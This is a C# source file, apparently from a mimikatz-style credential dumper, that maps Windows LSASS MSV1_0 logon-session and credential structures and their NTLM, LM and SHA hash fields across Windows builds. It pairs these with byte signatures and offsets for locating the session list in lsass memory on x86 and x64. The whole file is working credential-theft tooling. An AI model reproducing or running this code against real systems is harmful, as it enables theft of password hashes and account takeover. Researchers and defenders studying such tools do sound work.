﻿using Microsoft.Win32;
using System;
using System.Runtime.InteropServices;

namespace GetLsassSessions
{
    public class SystemInfo
    {
        [Flags]
        public enum PROCESSOR_ARCHITECTURE
        {
            AMD64 = 9,
            ARM = 5,
            IA64 = 6,
            INTEL = 0,
            AARCH64 = 0x8003,
            UNKNOWN = 0xffff
        }

        [Flags]
        public enum WindowsBuild
        {
            WIN_XP = 2600,
            WIN_2K3 = 3790,
            WIN_VISTA = 6000,
            WIN_7 = 7600,
            WIN_8 = 9200,
            WIN_BLUE = 9600,
            WIN_10_1507 = 10240,
            WIN_10_1511 = 10586,
            WIN_10_1607 = 14393,
            WIN_10_1703 = 15063,
            WIN_10_1709 = 16299,
            WIN_10_1803 = 17134,
            WIN_10_1809 = 17763,
            WIN_10_1903 = 18362
        }

        [Flags]
        public enum WindowsMinBuild
        {
            WIN_XP = 2500,
            WIN_2K3 = 3000,
            WIN_VISTA = 5000,
            WIN_7 = 7000,
            WIN_8 = 8000,
            WIN_BLUE = 9400,
            WIN_10 = 9800
        }
    }

    internal class Template
    {
        public const int LM_NTLM_HASH_LENGTH = 16;
        public const int SHA_DIGEST_LENGTH = 20;

        [StructLayout(LayoutKind.Sequential)]
        public struct LARGE_INTEGER
        {
            public int LowPart;
            public int HighPart;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct UNICODE_STRING
        {
            public ushort Length;
            public ushort MaximumLength;
            public long Buffer;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LUID_AND_ATTRIBUTES
        {
            public LUID Luid;
            public uint Attributes;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct LIST_ENTRY
        {
            public IntPtr Flink;
            public IntPtr Blink;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_MSV1_0_PRIMARY_CREDENTIALS
        {
            public long next;
            public UNICODE_STRING Primary;
            public UNICODE_STRING Credentials;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_MSV1_0_CREDENTIALS
        {
            public IntPtr next;
            public uint AuthenticationPackageId;
            public IntPtr PrimaryCredentials;
        }

        //KIWI_MSV1_0_LIST_XX
        public struct KIWI_MSV1_0_LIST_51
        {
            public IntPtr Flink;
            public IntPtr Blink;
            public LUID LocallyUniqueIdentifier;
            public UNICODE_STRING UserName;
            public UNICODE_STRING Domain;
            public IntPtr unk0;
            public IntPtr unk1;
            public IntPtr pSid;
            public uint LogonType;
            public uint Session;
            public LARGE_INTEGER LogonTime;
            public UNICODE_STRING LogonServer;
            public IntPtr Credentials;
            public ulong unk19;
            public IntPtr unk20;
            public IntPtr unk21;
            public IntPtr unk22;
            public ulong unk23;
            public IntPtr CredentialManager;
        }

        public struct KIWI_MSV1_0_LIST_52
        {
            public IntPtr Flink;
            public IntPtr Blink;
            public LUID LocallyUniqueIdentifier;
            public UNICODE_STRING UserName;
            public UNICODE_STRING Domain;
            public IntPtr unk0;
            public IntPtr unk1;
            public IntPtr pSid;
            public uint LogonType;
            public uint Session;
            public LARGE_INTEGER LogonTime;
            public UNICODE_STRING LogonServer;
            public IntPtr Credentials;
            public ulong unk19;
            public IntPtr unk20;
            public IntPtr unk21;
            public ulong unk22;
            public IntPtr CredentialManager;
        }

        public struct KIWI_MSV1_0_LIST_60
        {
            public IntPtr Flink;
            public IntPtr Blink;
            public IntPtr unk0;
            public uint unk1;
            public IntPtr unk2;
            public uint unk3;
            public uint unk4;
            public uint unk5;
            public IntPtr hSemaphore6;
            public IntPtr unk7;
            public IntPtr hSemaphore8;
            public IntPtr unk9;
            public IntPtr unk10;
            public uint unk11;
            public uint unk12;
            public IntPtr unk13;
            public LUID LocallyUniqueIdentifier;
            public LUID SecondaryLocallyUniqueIdentifier;

            public UNICODE_STRING UserName;

            public UNICODE_STRING Domain;
            public IntPtr unk14;
            public IntPtr unk15;
            public IntPtr pSid;
            public uint LogonType;
            public uint Session;
            public LARGE_INTEGER LogonTime;
            public UNICODE_STRING LogonServer;
            public IntPtr Credentials;
            public ulong unk19;
            public IntPtr unk20;
            public IntPtr unk21;
            public IntPtr unk22;
            public IntPtr CredentialManager;
        }

        public struct KIWI_MSV1_0_LIST_61
        {
            public IntPtr Flink;
            public IntPtr Blink;
            public IntPtr unk0;
            public uint unk1;
            public IntPtr unk2;
            public uint unk3;
            public uint unk4;
            public uint unk5;
            public IntPtr hSemaphore6;
            public IntPtr unk7;
            public IntPtr hSemaphore8;
            public IntPtr unk9;
            public IntPtr unk10;
            public uint unk11;
            public uint unk12;
            public IntPtr unk13;
            public LUID LocallyUniqueIdentifier;
            public LUID SecondaryLocallyUniqueIdentifier;

            public UNICODE_STRING UserName;

            public UNICODE_STRING Domain;
            public IntPtr unk14;
            public IntPtr unk15;
            public IntPtr pSid;
            public uint LogonType;
            public uint Session;
            public LARGE_INTEGER LogonTime;
            public UNICODE_STRING LogonServer;
            public IntPtr Credentials;
            public IntPtr unk19;
            public IntPtr unk20;
            public IntPtr unk21;
            public uint unk22;
            public IntPtr CredentialManager;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ
        {
            public IntPtr Flink;
            public IntPtr Blink;
            public IntPtr unk0;
            public uint unk1;
            public IntPtr unk2;
            public uint unk3;
            public uint unk4;
            public uint unk5;
            public IntPtr hSemaphore6;
            public IntPtr unk7;
            public IntPtr hSemaphore8;
            public IntPtr unk9;
            public IntPtr unk10;
            public uint unk11;
            public uint unk12;
            public IntPtr unk13;
            public LUID LocallyUniqueIdentifier;
            public LUID SecondaryLocallyUniqueIdentifier;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 12)]
            public byte[] waza;

            public UNICODE_STRING UserName;

            public UNICODE_STRING Domain;
            public IntPtr unk14;
            public IntPtr unk15;
            public IntPtr pSid;
            public uint LogonType;
            public uint Session;
            public LARGE_INTEGER LogonTime;
            public UNICODE_STRING LogonServer;
            public IntPtr Credentials;
            public IntPtr unk19;
            public IntPtr unk20;
            public IntPtr unk21;
            public uint unk22;
            public IntPtr CredentialManager;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_MSV1_0_LIST_62
        {
            public IntPtr Flink;
            public IntPtr Blink;
            public IntPtr unk0;
            public uint unk1;
            public IntPtr unk2;
            public uint unk3;
            public uint unk4;
            public uint unk5;
            public IntPtr hSemaphore6;
            public IntPtr unk7;
            public IntPtr hSemaphore8;
            public IntPtr unk9;
            public IntPtr unk10;
            public uint unk11;
            public uint unk12;
            public IntPtr unk13;
            public LUID LocallyUniqueIdentifier;
            public LUID SecondaryLocallyUniqueIdentifier;

            public UNICODE_STRING UserName;

            public UNICODE_STRING Domain;
            public IntPtr unk14;
            public IntPtr unk15;
            public UNICODE_STRING Type;
            public IntPtr pSid;
            public uint LogonType;
            public IntPtr unk18;
            public uint Session;
            public LARGE_INTEGER LogonTime;
            public UNICODE_STRING LogonServer;
            public IntPtr Credentials;
            public IntPtr unk19;
            public IntPtr unk20;
            public IntPtr unk21;
            public uint unk22;
            public uint unk23;
            public uint unk24;
            public uint unk25;
            public uint unk26;
            public IntPtr unk27;
            public IntPtr unk28;
            public IntPtr unk29;
            public IntPtr CredentialManager;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_MSV1_0_LIST_63
        {
            public IntPtr Flink;
            public IntPtr Blink;
            public IntPtr unk0;
            public uint unk1;
            public IntPtr unk2;
            public uint unk3;
            public uint unk4;
            public uint unk5;
            public IntPtr hSemaphore6;
            public IntPtr unk7;
            public IntPtr hSemaphore8;
            public IntPtr unk9;
            public IntPtr unk10;
            public uint unk11;
            public uint unk12;
            public IntPtr unk13;
            public LUID LocallyUniqueIdentifier;
            public LUID SecondaryLocallyUniqueIdentifier;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 12)]
            public byte[] waza;

            public UNICODE_STRING UserName;

            public UNICODE_STRING Domain;
            public IntPtr unk14;
            public IntPtr unk15;
            public UNICODE_STRING Type;
            public IntPtr pSid;
            public uint LogonType;
            public IntPtr unk18;
            public uint Session;
            public LARGE_INTEGER LogonTime;
            public UNICODE_STRING LogonServer;
            public IntPtr Credentials;
            public IntPtr unk19;
            public IntPtr unk20;
            public IntPtr unk21;
            public uint unk22;
            public uint unk23;
            public uint unk24;
            public uint unk25;
            public uint unk26;
            public IntPtr unk27;
            public IntPtr unk28;
            public IntPtr unk29;
            public IntPtr CredentialManager;
        }

        //KIWI_X_PRIMARY_CREDENTIAL
        [StructLayout(LayoutKind.Sequential)]
        public struct KIWI_GENERIC_PRIMARY_CREDENTIAL
        {
            public UNICODE_STRING Domain;
            public UNICODE_STRING UserName;
            public UNICODE_STRING Password;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MSV1_0_PRIMARY_CREDENTIAL
        {
            private readonly UNICODE_STRING LogonDomainName;
            private readonly UNICODE_STRING UserName;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
            private readonly byte[] NtOwfPassword;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
            private readonly byte[] LmOwfPassword;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = SHA_DIGEST_LENGTH)]
            private readonly byte[] ShaOwPassword;

            private readonly byte isNtOwfPassword;
            private readonly byte isLmOwfPassword;
            private readonly byte isShaOwPassword;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MSV1_0_PRIMARY_CREDENTIAL_10_OLD
        {
            private readonly UNICODE_STRING LogonDomainName;
            private readonly UNICODE_STRING UserName;
            private readonly byte isIso;
            private readonly byte isNtOwfPassword;
            private readonly byte isLmOwfPassword;
            private readonly byte isShaOwPassword;
            private readonly byte align0;
            private readonly byte align1;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
            private readonly byte[] NtOwfPassword;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
            private readonly byte[] LmOwfPassword;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = SHA_DIGEST_LENGTH)]
            private readonly byte[] ShaOwPassword;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MSV1_0_PRIMARY_CREDENTIAL_10
        {
            private readonly UNICODE_STRING LogonDomainName;
            private readonly UNICODE_STRING UserName;
            private readonly byte isIso;
            private readonly byte isNtOwfPassword;
            private readonly byte isLmOwfPassword;
            private readonly byte isShaOwPassword;
            private readonly byte align0;
            private readonly byte align1;
            private readonly byte align2;
            private readonly byte align3;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
            private readonly byte[] NtOwfPassword;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
            private readonly byte[] LmOwfPassword;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = SHA_DIGEST_LENGTH)]
            private readonly byte[] ShaOwPassword;

            /* buffer */
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct MSV1_0_PRIMARY_CREDENTIAL_10_1607
        {
            private readonly UNICODE_STRING LogonDomainName;
            private readonly UNICODE_STRING UserName;
            private readonly IntPtr pNtlmCredIsoInProc;
            private readonly byte isIso;
            private readonly byte isNtOwfPassword;
            private readonly byte isLmOwfPassword;
            private readonly byte isShaOwPassword;
            private readonly byte isDPAPIProtected;
            private readonly byte align0;
            private readonly byte align1;
            private readonly byte align2;

            private readonly uint unkD;
            private readonly ushort isoSize;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
            private readonly byte[] DPAPIProtected;

            private readonly uint align3;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
            private readonly byte[] NtOwfPassword;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = LM_NTLM_HASH_LENGTH)]
            private readonly byte[] LmOwfPassword;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = SHA_DIGEST_LENGTH)]
            private readonly byte[] ShaOwPassword;

            /* buffer */
        }

        public static int StructFieldOffset(Type s, string field)
        {
            var ex = typeof(Template);
            var mi = ex.GetMethod("FieldOffset");
            var miConstructed = mi.MakeGenericMethod(s);
            object[] args = { field };
            return (int)miConstructed.Invoke(null, args);
        }

        public static int FieldOffset<T>(string fieldName)
        {
            return Marshal.OffsetOf(typeof(T), fieldName).ToInt32();
        }

        public struct LsassTemplate
        {
            public byte[] signature;
            public int first_entry_offset;
            public int LogonSessionListCountOffset;
            public int ListTypeSize;
            public int LocallyUniqueIdentifierOffset;
            public int LogonTypeOffset;
            public int SessionOffset;
            public int UserNameListOffset;
            public int DomainOffset;
            public int CredentialsOffset;
            public int pSidOffset;
            public int CredentialManagerOffset;
            public int LogonTimeOffset;
            public int LogonServerOffset;
            public int MSV1CredentialsOffset;
            public int MSV1PrimaryOffset;
            public int LogonDomainNameOffset;
            public int UserNameOffset;
            public int LmOwfPasswordOffset;
            public int NtOwfPasswordOffset;
            public int ShaOwPasswordOffset;
            public int DPAPIProtectedOffset;
            public Type PrimaryCredentialType;
            public Type list_entry;
            public Type credential_entry;
            public int PasswordOffset;
        }

        public static LsassTemplate getTemplate()
        {
            var template = new LsassTemplate();

            template.MSV1CredentialsOffset = FieldOffset<KIWI_MSV1_0_PRIMARY_CREDENTIALS>("Credentials");
            template.MSV1PrimaryOffset = FieldOffset<KIWI_MSV1_0_PRIMARY_CREDENTIALS>("Primary");
            template.PasswordOffset = 0;

            int ProcessorArchitecture = 9;
            switch (typeof(string).Assembly.GetName().ProcessorArchitecture)
            {
                case System.Reflection.ProcessorArchitecture.X86:
                    ProcessorArchitecture = 0;
                    break;

                case System.Reflection.ProcessorArchitecture.Amd64:
                    ProcessorArchitecture = 9;
                    break;

                case System.Reflection.ProcessorArchitecture.Arm:
                    ProcessorArchitecture = 12;
                    break;
            }

            int BuildNumber = int.Parse((string)Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion").GetValue("CurrentBuildNumber"));
            uint msv_dll_timestamp = 0;

            //identify credential session list structure to be used
            if (BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_2K3)
            {
                template.list_entry = typeof(KIWI_MSV1_0_LIST_51);
            }
            else if (BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_VISTA)
            {
                template.list_entry = typeof(KIWI_MSV1_0_LIST_52);
            }
            else if (BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_7)
            {
                template.list_entry = typeof(KIWI_MSV1_0_LIST_60);
            }
            else if (BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_8)
            {
                //do not do that :) //skelsec
                if (msv_dll_timestamp > 0x53480000)
                {
                    template.list_entry = typeof(KIWI_MSV1_0_LIST_61_ANTI_MIMIKATZ);
                }
                else
                {
                    template.list_entry = typeof(KIWI_MSV1_0_LIST_61);
                }
            }
            else if (BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_BLUE)
            {
                //template.list_entry = PKIWI_MSV1_0_LIST_62
                if (msv_dll_timestamp > 0x53480000)
                {
                    template.list_entry = typeof(KIWI_MSV1_0_LIST_63);
                }
                else
                {
                    template.list_entry = typeof(KIWI_MSV1_0_LIST_62);
                }
            }
            else
            {
                template.list_entry = typeof(KIWI_MSV1_0_LIST_63);
            }
            template.ListTypeSize = Marshal.SizeOf(template.list_entry);
            template.LocallyUniqueIdentifierOffset = StructFieldOffset(template.list_entry, "LocallyUniqueIdentifier");
            template.LogonTypeOffset = StructFieldOffset(template.list_entry, "LogonType");
            template.SessionOffset = StructFieldOffset(template.list_entry, "Session");
            template.UserNameListOffset = StructFieldOffset(template.list_entry, "UserName");
            template.DomainOffset = StructFieldOffset(template.list_entry, "Domain");
            template.CredentialsOffset = StructFieldOffset(template.list_entry, "Credentials");
            template.pSidOffset = StructFieldOffset(template.list_entry, "pSid");
            template.CredentialManagerOffset = StructFieldOffset(template.list_entry, "CredentialManager");
            template.LogonTimeOffset = StructFieldOffset(template.list_entry, "LogonTime");
            template.LogonServerOffset = StructFieldOffset(template.list_entry, "LogonServer");

            //
            if (BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1507)
            {
                template.credential_entry = typeof(MSV1_0_PRIMARY_CREDENTIAL);
            }
            else if (BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1511)
            {
                template.credential_entry = typeof(MSV1_0_PRIMARY_CREDENTIAL_10_OLD);
            }
            else if (BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1607)
            {
                template.credential_entry = typeof(MSV1_0_PRIMARY_CREDENTIAL_10);
            }
            else
            {
                template.credential_entry = typeof(MSV1_0_PRIMARY_CREDENTIAL_10_1607);
                template.PasswordOffset = -2;
            }

            template.LogonDomainNameOffset = StructFieldOffset(template.credential_entry, "LogonDomainName");
            template.UserNameOffset = StructFieldOffset(template.credential_entry, "UserName");
            template.LmOwfPasswordOffset = StructFieldOffset(template.credential_entry, "LmOwfPassword") + template.PasswordOffset;
            template.NtOwfPasswordOffset = StructFieldOffset(template.credential_entry, "NtOwfPassword") + template.PasswordOffset;
            template.ShaOwPasswordOffset = StructFieldOffset(template.credential_entry, "ShaOwPassword") + template.PasswordOffset;

            if (template.credential_entry != typeof(MSV1_0_PRIMARY_CREDENTIAL_10_1607))
            {
                template.DPAPIProtectedOffset = 0;
            }
            else
            {
                template.DPAPIProtectedOffset = FieldOffset<MSV1_0_PRIMARY_CREDENTIAL_10_1607>("DPAPIProtected");
            }

            if (ProcessorArchitecture == (int)SystemInfo.PROCESSOR_ARCHITECTURE.AMD64)
            {
                if ((int)SystemInfo.WindowsMinBuild.WIN_XP <= BuildNumber && BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_2K3)
                {
                    template.signature = new byte[] { 0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8 };
                    template.first_entry_offset = -4;
                    template.LogonSessionListCountOffset = 0;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_2K3 <= BuildNumber && BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_VISTA)
                {
                    template.signature = new byte[] { 0x4c, 0x8b, 0xdf, 0x49, 0xc1, 0xe3, 0x04, 0x48, 0x8b, 0xcb, 0x4c, 0x03, 0xd8 };
                    template.first_entry_offset = -4;
                    template.LogonSessionListCountOffset = -45;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_VISTA <= BuildNumber && BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_7)
                {
                    template.signature = new byte[] { 0x33, 0xff, 0x45, 0x85, 0xc0, 0x41, 0x89, 0x75, 0x00, 0x4c, 0x8b, 0xe3, 0x0f, 0x84 };
                    template.first_entry_offset = 21;
                    template.LogonSessionListCountOffset = -4;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_7 <= BuildNumber && BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_8)
                {
                    template.signature = new byte[] { 0x33, 0xf6, 0x45, 0x89, 0x2f, 0x4c, 0x8b, 0xf3, 0x85, 0xff, 0x0f, 0x84 };
                    template.first_entry_offset = 19;
                    template.LogonSessionListCountOffset = -4;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_8 <= BuildNumber && BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_BLUE)
                {
                    template.signature = new byte[] { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
                    template.first_entry_offset = 16;
                    template.LogonSessionListCountOffset = -4;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_BLUE <= BuildNumber && BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1507)
                {
                    template.signature = new byte[] { 0x8b, 0xde, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05 };
                    template.first_entry_offset = 36;
                    template.LogonSessionListCountOffset = -6;
                }
                else if ((int)SystemInfo.WindowsBuild.WIN_10_1507 <= BuildNumber && BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1703)
                {
                    //1503 and 1603
                    template.signature = new byte[] { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
                    template.first_entry_offset = 16;
                    template.LogonSessionListCountOffset = -4;
                }
                else if ((int)SystemInfo.WindowsBuild.WIN_10_1703 <= BuildNumber && BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1803)
                {
                    //1703
                    template.signature = new byte[] { 0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74 };
                    template.first_entry_offset = 23;
                    template.LogonSessionListCountOffset = -4;
                }
                else if ((int)SystemInfo.WindowsBuild.WIN_10_1803 <= BuildNumber && BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1903)
                {
                    //1803
                    template.signature = new byte[] { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74 };
                    template.first_entry_offset = 23;
                    template.LogonSessionListCountOffset = -4;
                }
                else
                {
                    //1903
                    template.signature = new byte[] { 0x33, 0xff, 0x41, 0x89, 0x37, 0x4c, 0x8b, 0xf3, 0x45, 0x85, 0xc0, 0x74 };
                    template.first_entry_offset = 23;
                    template.LogonSessionListCountOffset = -4;
                }
            }
            else if (ProcessorArchitecture == (int)SystemInfo.PROCESSOR_ARCHITECTURE.INTEL)
            {
                if ((int)SystemInfo.WindowsMinBuild.WIN_XP <= BuildNumber && BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_2K3)
                {
                    template.signature = new byte[] { 0xff, 0x50, 0x10, 0x85, 0xc0, 0x0f, 0x84 };
                    template.first_entry_offset = 24;
                    template.LogonSessionListCountOffset = 0;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_2K3 <= BuildNumber && BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_VISTA)
                {
                    template.signature = new byte[] { 0x89, 0x71, 0x04, 0x89, 0x30, 0x8d, 0x04, 0xbd };
                    template.first_entry_offset = -11;
                    template.LogonSessionListCountOffset = -43;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_VISTA <= BuildNumber && BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_8)
                {
                    template.signature = new byte[] { 0x89, 0x71, 0x04, 0x89, 0x30, 0x8d, 0x04, 0xbd };
                    template.first_entry_offset = -11;
                    template.LogonSessionListCountOffset = -42;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_8 <= BuildNumber && BuildNumber < (int)SystemInfo.WindowsMinBuild.WIN_BLUE)
                {
                    template.signature = new byte[] { 0x8b, 0x45, 0xf8, 0x8b, 0x55, 0x08, 0x8b, 0xde, 0x89, 0x02, 0x89, 0x5d, 0xf0, 0x85, 0xc9, 0x74 };
                    template.first_entry_offset = 18;
                    template.LogonSessionListCountOffset = -4;
                }
                else if ((int)SystemInfo.WindowsMinBuild.WIN_BLUE <= BuildNumber && BuildNumber < (int)SystemInfo.WindowsBuild.WIN_10_1507)
                {
                    template.signature = new byte[] { 0x8b, 0x4d, 0xe4, 0x8b, 0x45, 0xf4, 0x89, 0x75, 0xe8, 0x89, 0x01, 0x85, 0xff, 0x74 };
                    template.first_entry_offset = 16;
                    template.LogonSessionListCountOffset = -4;
                }
                else if (BuildNumber >= (int)SystemInfo.WindowsBuild.WIN_10_1507)
                {
                    template.signature = new byte[] { 0x8b, 0x4d, 0xe8, 0x8b, 0x45, 0xf4, 0x89, 0x75, 0xec, 0x89, 0x01, 0x85, 0xff, 0x74 };
                    template.first_entry_offset = 16;
                    template.LogonSessionListCountOffset = -4;
                }
                else
                {
                    throw new Exception($"Could not identify template! {BuildNumber}");
                }
            }
            else
            {
                throw new Exception($"Unknown architecture! {ProcessorArchitecture}");
            }

            return template;
        }
    }
}